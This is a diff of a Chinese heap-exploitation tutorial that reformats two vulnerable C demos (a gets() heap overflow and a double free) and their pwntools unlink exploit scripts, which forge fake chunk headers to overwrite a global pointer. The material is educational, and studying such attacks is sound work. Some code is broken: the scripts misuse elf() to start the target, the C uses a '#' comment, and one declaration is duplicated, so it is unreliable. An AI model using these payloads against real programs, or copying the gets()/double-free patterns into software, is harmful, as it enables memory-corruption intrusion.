@@ -71,64 +71,67 @@ bd=ptr-8;
 
 #### Demo1
 
+```c
+void *global[80];
 
-	void *global[80];
-	
-	void *global[80];
-	
-	int main(void)
-	{
-	    void *p1,*p2;
-	    p1=malloc(200);
-	    p2=malloc(200);
-	    global[40]=p1;
-	    printf("before exploit:%x\n",global[40]);
-	    puts("read");//for debug
-	    gets(p1);//overflow
-	    free(p2);
-	    printf("after exploit:%x\n",global[40]);
-	    return 0;
-	}
+void *global[80];
 
+int main(void)
+{
+    void *p1,*p2;
+    p1=malloc(200);
+    p2=malloc(200);
+    global[40]=p1;
+    printf("before exploit:%x\n",global[40]);
+    puts("read");//for debug
+    gets(p1);//overflow
+    free(p2);
+    printf("after exploit:%x\n",global[40]);
+    return 0;
+}
+```
 
 这是对应于第一种堆溢出覆盖下一块堆的情况的，如果使用下面的exp就会发现global中malloc返回的地址已经变成了 global[40]本身的地址－0xC
 
-	from pwn import*
-	io=elf('./demo1')
-	io.recvuntil('read')
-	sc=p32(0x0)+p32(0xc9)+p32(0x804A100-0xc)+p32(0x0804A100-0x8)+'a'*(200-16)+p32(0xc8)+p32(0xd0)
-	io.sendline(sc)
-	io.read()
-
+```python
+from pwn import*
+io=elf('./demo1')
+io.recvuntil('read')
+sc=p32(0x0)+p32(0xc9)+p32(0x804A100-0xc)+p32(0x0804A100-0x8)+'a'*(200-16)+p32(0xc8)+p32(0xd0)
+io.sendline(sc)
+io.read()
+```
 
 #### Demo2
 
-	int *global[40];
-	int main(void)
-	{
-	  void *p1,*p2,*p3;
-	  p1=malloc(200);
-	  p2=malloc(200);
-	  global[20]=p1;
-	  free(p1);
-	  free(p2);
-	  p3=malloc(500);
-	  puts("get"); #for debug
-	  gets(p3);
-	  free(p2);
-	  return;
-	}
+```c
+int *global[40];
+int main(void)
+{
+  void *p1,*p2,*p3;
+  p1=malloc(200);
+  p2=malloc(200);
+  global[20]=p1;
+  free(p1);
+  free(p2);
+  p3=malloc(500);
+  puts("get"); #for debug
+  gets(p3);
+  free(p2);
+  return;
+}
+```
 
 这个Demo展示的是double free。可以看到对于p2指针来说确实是释放了两次。
 
-
-	from pwn import*
-	io=elf('./demo2')
-	io.recvuntil('get')
-	sc=p32(0x0)+p32(201)+p32(0x804a0b0-0xC)+p32(0x804a0b0-0x8)+'a'*(200-16)+p32(200)+p32(0x128)
-	io.sendline(sc)
-	io.read()
-
+```python
+from pwn import*
+io=elf('./demo2')
+io.recvuntil('get')
+sc=p32(0x0)+p32(201)+p32(0x804a0b0-0xC)+p32(0x804a0b0-0x8)+'a'*(200-16)+p32(200)+p32(0x128)
+io.sendline(sc)
+io.read()
+```
 
 
 
